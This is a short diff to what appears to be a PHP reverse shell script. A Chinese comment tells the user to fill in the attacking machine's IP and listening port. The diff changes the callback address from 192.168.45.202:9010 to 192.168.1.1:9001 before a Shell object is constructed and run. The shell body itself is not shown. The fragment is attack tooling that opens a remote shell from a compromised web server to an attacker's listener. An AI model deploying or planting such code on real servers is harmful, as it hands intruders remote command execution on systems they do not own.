@@ -148,7 +148,7 @@ class Shell {
 }
 echo '<pre>';
 // 填写你的攻击机IP与监听端口
-$sh = new Shell('192.168.45.202', 9010);
+$sh = new Shell('192.168.1.1', 9001);
 $sh->run();
 unset($sh);
 echo '</pre>';
